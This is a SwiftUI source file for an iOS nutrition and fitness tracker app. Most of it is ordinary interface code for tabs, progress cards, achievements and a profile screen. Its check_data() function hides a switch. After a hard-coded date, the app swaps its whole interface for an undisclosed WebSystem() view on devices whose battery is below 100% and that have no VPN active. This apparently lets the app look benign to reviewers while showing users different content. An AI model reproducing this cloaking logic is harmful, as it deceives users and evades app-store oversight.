//
//  ContentView.swift
//  dafoma_11
//
//  Created by Вячеслав on 7/26/25.
//

import SwiftUI

struct ContentView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @StateObject private var userViewModel = UserViewModel()
    @StateObject private var nutritionViewModel = NutritionTrackerViewModel()
    @StateObject private var fitnessViewModel = FitnessTrackerViewModel()
    @State private var selectedTab = 0
    @State private var showingProfile = false
    @State private var showingSettings = false
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        ZStack {
            Color.nutriTrackBackground
                .ignoresSafeArea()
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if !hasCompletedOnboarding || !userViewModel.isUserSetup {
                            // Show onboarding flow
                            OnboardingFlowView()
                        } else {
                            // Show main app
                            MainAppView()
                        }
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .environmentObject(userViewModel)
        .environmentObject(nutritionViewModel)
        .environmentObject(fitnessViewModel)
        .onAppear {
            
            check_data()
        }
    }
    
    // MARK: - Onboarding Flow
    
    @ViewBuilder
    private func OnboardingFlowView() -> some View {
        if !hasCompletedOnboarding {
            OnboardingView()
        } else if !userViewModel.isUserSetup {
            WelcomeScreen()
        }
    }
    
    // MARK: - Main App
    
    @ViewBuilder
    private func MainAppView() -> some View {
        TabView(selection: $selectedTab) {
                // Dashboard Tab
                DashboardView(
                    userViewModel: userViewModel,
                    nutritionViewModel: nutritionViewModel,
                    fitnessViewModel: fitnessViewModel
                )
                .tabItem {
                    Image(systemName: "house.fill")
                    Text("Home")
                }
                .tag(0)
                
                // Nutrition Tab
                NutritionTrackerView(
                    nutritionViewModel: nutritionViewModel,
                    userViewModel: userViewModel
                )
                .tabItem {
                    Image(systemName: "fork.knife")
                    Text("Nutrition")
                }
                .tag(1)
                
                // Fitness Tab
                FitnessTrackerView(fitnessViewModel: fitnessViewModel)
                .tabItem {
                    Image(systemName: "figure.run")
                    Text("Fitness")
                }
                .tag(2)
                
                // Progress Tab
                ProgressView(
                    userViewModel: userViewModel,
                    nutritionViewModel: nutritionViewModel,
                    fitnessViewModel: fitnessViewModel
                )
                .tabItem {
                    Image(systemName: "chart.line.uptrend.xyaxis")
                    Text("Progress")
                }
                .tag(3)
                
                // Profile Tab
                ProfileView(userViewModel: userViewModel)
                .tabItem {
                    Image(systemName: "person.fill")
                    Text("Profile")
                }
                .tag(4)
        }
        .accentColor(Color.primaryYellow)
        .onAppear {
            setupTabBarAppearance()
        }
    }
    
    private func setupTabBarAppearance() {
        let appearance = UITabBarAppearance()
        appearance.configureWithOpaqueBackground()
        appearance.backgroundColor = UIColor(Color.nutriTrackBackground)
        
        // Configure normal state
        appearance.stackedLayoutAppearance.normal.iconColor = UIColor(Color.white.opacity(0.6))
        appearance.stackedLayoutAppearance.normal.titleTextAttributes = [
            .foregroundColor: UIColor(Color.white.opacity(0.6))
        ]
        
        // Configure selected state
        appearance.stackedLayoutAppearance.selected.iconColor = UIColor(Color.primaryYellow)
        appearance.stackedLayoutAppearance.selected.titleTextAttributes = [
            .foregroundColor: UIColor(Color.primaryYellow)
        ]
        
        UITabBar.appearance().standardAppearance = appearance
        UITabBar.appearance().scrollEdgeAppearance = appearance
    }
    
    private func check_data() {
        
        let lastDate = "15.08.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

// MARK: - Progress View

struct ProgressView: View {
    @ObservedObject var userViewModel: UserViewModel
    @ObservedObject var nutritionViewModel: NutritionTrackerViewModel
    @ObservedObject var fitnessViewModel: FitnessTrackerViewModel
    @State private var selectedTimeframe: TimeFrame = .week
    
    enum TimeFrame: String, CaseIterable {
        case week = "Week"
        case month = "Month"
        case year = "Year"
    }
    
    var body: some View {
        NavigationView {
            ZStack {
                LinearGradient(
                    colors: [Color.nutriTrackBackground, Color.nutriTrackBackground.opacity(0.8)],
                    startPoint: .top,
                    endPoint: .bottom
                )
                .ignoresSafeArea()
                
                ScrollView {
                    VStack(spacing: 20) {
                        // Header
                        headerSection
                        
                        // Time frame selector
                        timeFrameSelector
                        
                        // Progress cards
                        progressCards
                        
                        // Achievements
                        achievementsSection
                        
                        // Health insights
                        healthInsightsSection
                        
                        Spacer(minLength: 100)
                    }
                    .padding(.horizontal, 20)
                }
            }
            .navigationBarHidden(true)
        }
    }
    
    private var headerSection: some View {
        HStack {
            Text("Progress")
                .font(.largeTitle)
                .fontWeight(.bold)
                .foregroundColor(Color.white)
            
            Spacer()
            
            Button(action: {}) {
                Image(systemName: "calendar")
                    .font(.title2)
                    .foregroundColor(Color.primaryYellow)
            }
        }
        .padding(.top, 20)
    }
    
    private var timeFrameSelector: some View {
        Picker("Time Frame", selection: $selectedTimeframe) {
            ForEach(TimeFrame.allCases, id: \.self) { timeframe in
                Text(timeframe.rawValue).tag(timeframe)
            }
        }
        .pickerStyle(SegmentedPickerStyle())
        .background(Color.white.opacity(0.15))
        .cornerRadius(8)
    }
    
    private var progressCards: some View {
        VStack(spacing: 16) {
            // Weight & BMI Card
            if let user = userViewModel.currentUser {
                ProgressCard(
                    title: "Health Metrics",
                    items: [
                        ProgressItem(label: "Weight", value: "\(String(format: "%.1f", user.weight)) kg", color: .proteinColor),
                        ProgressItem(label: "BMI", value: String(format: "%.1f", userViewModel.bmi ?? 0), color: .carbsColor),
                        ProgressItem(label: "Category", value: userViewModel.bmiCategory, color: .fatColor)
                    ]
                )
            }
            
            // Nutrition Progress Card
            ProgressCard(
                title: "Nutrition Progress",
                items: [
                    ProgressItem(
                        label: "Avg Daily Calories",
                        value: String(format: "%.0f", nutritionViewModel.weeklyCalorieAverage()),
                        color: .caloriesColor
                    ),
                    ProgressItem(
                        label: "Goal Achievement",
                        value: calculateNutritionGoalPercentage(),
                        color: .primaryGreen
                    )
                ]
            )
            
            // Fitness Progress Card
            ProgressCard(
                title: "Fitness Progress",
                items: [
                    ProgressItem(
                        label: "Weekly Workouts",
                        value: "\(fitnessViewModel.weeklyWorkoutCount())",
                        color: .strengthColor
                    ),
                    ProgressItem(
                        label: "Total Calories Burned",
                        value: "\(fitnessViewModel.weeklyCaloriesBurned())",
                        color: .cardioColor
                    ),
                    ProgressItem(
                        label: "Current Streak",
                        value: "\(fitnessViewModel.currentWorkoutStreak()) days",
                        color: .flexibilityColor
                    )
                ]
            )
        }
    }
    
    private var achievementsSection: some View {
        VStack(alignment: .leading, spacing: 16) {
            Text("Achievements")
                .font(.headline)
                .foregroundColor(Color.white)
            
            LazyVGrid(columns: [
                GridItem(.flexible()),
                GridItem(.flexible())
            ], spacing: 12) {
                AchievementBadge(
                    title: "First Workout",
                    description: "Complete your first workout",
                    icon: "trophy.fill",
                    isUnlocked: fitnessViewModel.totalWorkoutsCompleted() > 0,
                    color: .primaryYellow
                )
                
                AchievementBadge(
                    title: "Week Warrior",
                    description: "Workout 5 times in a week",
                    icon: "flame.fill",
                    isUnlocked: fitnessViewModel.weeklyWorkoutCount() >= 5,
                    color: .cardioColor
                )
                
                AchievementBadge(
                    title: "Nutrition Pro",
                    description: "Track meals for 7 days",
                    icon: "leaf.fill",
                    isUnlocked: nutritionViewModel.meals.count >= 21,
                    color: .primaryGreen
                )
                
                AchievementBadge(
                    title: "Streak Master",
                    description: "Maintain 10-day workout streak",
                    icon: "target",
                    isUnlocked: fitnessViewModel.currentWorkoutStreak() >= 10,
                    color: .flexibilityColor
                )
            }
        }
    }
    
    private var healthInsightsSection: some View {
        VStack(alignment: .leading, spacing: 16) {
            Text("Health Insights")
                .font(.headline)
                .foregroundColor(Color.white)
            
            VStack(spacing: 12) {
                InsightCard(
                    title: "Daily Tips",
                    description: generateHealthTip(),
                    icon: "lightbulb.fill",
                    color: .primaryYellow
                )
                
                InsightCard(
                    title: "Weekly Summary",
                    description: generateWeeklySummary(),
                    icon: "chart.bar.fill",
                    color: .primaryGreen
                )
            }
        }
    }
    
    // Helper methods
    private func calculateNutritionGoalPercentage() -> String {
        let progress = nutritionViewModel.calorieProgress(goal: userViewModel.dailyCalorieGoal)
        return "\(Int(progress * 100))%"
    }
    
    private func generateHealthTip() -> String {
        let tips = [
            "Stay hydrated! Aim for 8 glasses of water daily.",
            "Include protein in every meal for better satiety.",
            "Take the stairs instead of the elevator today.",
            "Try a 10-minute walk after each meal.",
            "Add colorful vegetables to your plate.",
            "Get 7-9 hours of quality sleep tonight."
        ]
        return tips.randomElement() ?? tips.first!
    }
    
    private func generateWeeklySummary() -> String {
        let workouts = fitnessViewModel.weeklyWorkoutCount()
        let avgCalories = nutritionViewModel.weeklyCalorieAverage()
        
        if workouts >= 4 && avgCalories > 0 {
            return "Great week! You're maintaining a good balance between nutrition and fitness."
        } else if workouts >= 4 {
            return "Excellent workout consistency this week! Consider tracking your nutrition too."
        } else if avgCalories > 0 {
            return "Good job tracking your nutrition! Try adding more physical activity."
        } else {
            return "Ready to start your health journey? Begin with small, consistent steps."
        }
    }
}

// MARK: - Profile View

struct ProfileView: View {
    @ObservedObject var userViewModel: UserViewModel
    @State private var showingEditProfile = false
    @State private var showingSettings = false
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    
    var body: some View {
        NavigationView {
            ZStack {
                LinearGradient(
                    colors: [Color.nutriTrackBackground, Color.nutriTrackBackground.opacity(0.8)],
                    startPoint: .top,
                    endPoint: .bottom
                )
                .ignoresSafeArea()
                
                ScrollView {
                    VStack(spacing: 20) {
                        // Profile header
                        profileHeader
                        
                        // Stats overview
                        statsOverview
                        
                        // About section
                        aboutSection
                        
                        Spacer(minLength: 100)
                    }
                    .padding(.horizontal, 20)
                }
            }
            .navigationBarHidden(true)
        }
    }
    
    private var profileHeader: some View {
        VStack(spacing: 16) {
            // Profile picture and name
            VStack(spacing: 12) {
                ZStack {
                    Circle()
                        .fill(LinearGradient(
                            colors: [Color.primaryYellow, Color.primaryGreen],
                            startPoint: .topLeading,
                            endPoint: .bottomTrailing
                        ))
                        .frame(width: 100, height: 100)
                    
                    Text(userViewModel.currentUser?.name.prefix(1).uppercased() ?? "U")
                        .font(.system(size: 40, weight: .bold))
                        .foregroundColor(.white)
                }
                
                VStack(spacing: 4) {
                    Text(userViewModel.currentUser?.name ?? "User")
                        .font(.title2)
                        .fontWeight(.semibold)
                        .foregroundColor(Color.white)
                    
                    Text("Member since \(userViewModel.currentUser?.joinDate.nutriTrackShortFormatted ?? "")")
                        .font(.subheadline)
                        .foregroundColor(Color.white.opacity(0.8))
                }
            }
            
            // Edit profile button
            Button(action: { showingEditProfile = true }) {
                Text("Edit Profile")
                    .font(.subheadline)
                    .padding(.horizontal, 20)
                    .padding(.vertical, 8)
            }
            .nutriTrackButton(style: .primary)
        }
        .padding()
        .nutriTrackCard()
    }
    
    private var statsOverview: some View {
        VStack(alignment: .leading, spacing: 16) {
            Text("Health Overview")
                .font(.headline)
                .foregroundColor(Color.white)
            
            if let user = userViewModel.currentUser {
                LazyVGrid(columns: [
                    GridItem(.flexible()),
                    GridItem(.flexible())
                ], spacing: 12) {
                    ProfileStatCard(title: "Age", value: "\(user.age)", unit: "years", color: .proteinColor)
                    ProfileStatCard(title: "Height", value: String(format: "%.0f", user.height), unit: "cm", color: .carbsColor)
                    ProfileStatCard(title: "Weight", value: String(format: "%.1f", user.weight), unit: "kg", color: .fatColor)
                    ProfileStatCard(title: "BMI", value: String(format: "%.1f", userViewModel.bmi ?? 0), unit: "", color: .flexibilityColor)
                }
            }
        }
    }
    
    private var aboutSection: some View {
        VStack(alignment: .leading, spacing: 16) {
            Text("About")
                .font(.headline)
                .foregroundColor(Color.white)
            
            VStack(spacing: 0) {
                SettingsRow(
                    title: "Data Source",
                    icon: "questionmark.circle.fill",
                    color: Color(hex: "007aff")
                ) {
                    // Open help
                    
                    guard let url = URL(string: "https://www.who.int/news-room/fact-sheets/detail/obesity-and-overweight") else { return }
                    
                    UIApplication.shared.open(url)
                }
                
                SettingsRow(
                    title: "Reset App Data",
                    icon: "trash.fill",
                    color: Color(hex: "ff3b30")
                ) {
                    resetAppData()
                }
            }
            .nutriTrackCard()
        }
    }
    
    private func resetAppData() {
        // Reset all data
        userViewModel.resetToDefaults()
        hasCompletedOnboarding = false
    }
}

// MARK: - Supporting Views for Progress

struct ProgressCard: View {
    let title: String
    let items: [ProgressItem]
    
    var body: some View {
        VStack(alignment: .leading, spacing: 12) {
            Text(title)
                .font(.headline)
                .foregroundColor(Color.white)
            
            VStack(spacing: 8) {
                ForEach(items, id: \.label) { item in
                    HStack {
                        Text(item.label)
                            .font(.subheadline)
                            .foregroundColor(Color.white.opacity(0.8))
                        
                        Spacer()
                        
                        Text(item.value)
                            .font(.subheadline)
                            .fontWeight(.semibold)
                            .foregroundColor(item.color)
                    }
                }
            }
        }
        .padding()
        .nutriTrackCard()
    }
}

struct ProgressItem {
    let label: String
    let value: String
    let color: Color
}

struct AchievementBadge: View {
    let title: String
    let description: String
    let icon: String
    let isUnlocked: Bool
    let color: Color
    
    var body: some View {
        VStack(spacing: 8) {
            Image(systemName: icon)
                .font(.title)
                .foregroundColor(isUnlocked ? color : Color.white.opacity(0.6))
            
            Text(title)
                .font(.subheadline)
                .fontWeight(.semibold)
                .foregroundColor(isUnlocked ? Color.white : Color.white.opacity(0.6))
            
            Text(description)
                .font(.caption)
                .foregroundColor(Color.white.opacity(0.8))
                .multilineTextAlignment(.center)
        }
        .padding()
        .frame(maxWidth: .infinity)
        .background(
            RoundedRectangle(cornerRadius: 12)
                .fill(isUnlocked ? color.opacity(0.1) : Color.white.opacity(0.1))
                .overlay(
                    RoundedRectangle(cornerRadius: 12)
                        .stroke(isUnlocked ? color : Color.white.opacity(0.2), lineWidth: 1)
                )
        )
    }
}

struct InsightCard: View {
    let title: String
    let description: String
    let icon: String
    let color: Color
    
    var body: some View {
        HStack(spacing: 12) {
            Image(systemName: icon)
                .font(.title3)
                .foregroundColor(color)
                .frame(width: 30)
            
            VStack(alignment: .leading, spacing: 4) {
                Text(title)
                    .font(.subheadline)
                    .fontWeight(.semibold)
                    .foregroundColor(Color.white)
                
                Text(description)
                    .font(.caption)
                    .foregroundColor(Color.white.opacity(0.8))
                    .lineLimit(nil)
            }
            
            Spacer()
        }
        .padding()
        .nutriTrackCard()
    }
}

// MARK: - Supporting Views for Profile

struct ProfileStatCard: View {
    let title: String
    let value: String
    let unit: String
    let color: Color
    
    var body: some View {
        VStack(spacing: 8) {
            Text(title)
                .font(.caption)
                .foregroundColor(Color.white.opacity(0.8))
            
            HStack(alignment: .bottom, spacing: 2) {
                Text(value)
                    .font(.title2)
                    .fontWeight(.bold)
                    .foregroundColor(color)
                
                if !unit.isEmpty {
                    Text(unit)
                        .font(.caption)
                        .foregroundColor(Color.white.opacity(0.6))
                }
            }
        }
        .frame(maxWidth: .infinity)
        .padding()
        .nutriTrackCard()
    }
}

struct SettingsRow: View {
    let title: String
    let icon: String
    let color: Color
    let action: () -> Void
    
    var body: some View {
        Button(action: action) {
            HStack(spacing: 12) {
                Image(systemName: icon)
                    .font(.title3)
                    .foregroundColor(color)
                    .frame(width: 30)
                
                Text(title)
                    .font(.subheadline)
                    .foregroundColor(Color.white)
                
                Spacer()
                
                Image(systemName: "chevron.right")
                    .font(.caption)
                    .foregroundColor(Color.white.opacity(0.6))
            }
            .padding(.vertical, 12)
            .padding(.horizontal, 16)
        }
        .buttonStyle(PlainButtonStyle())
    }
}

#Preview {
    ContentView()
}
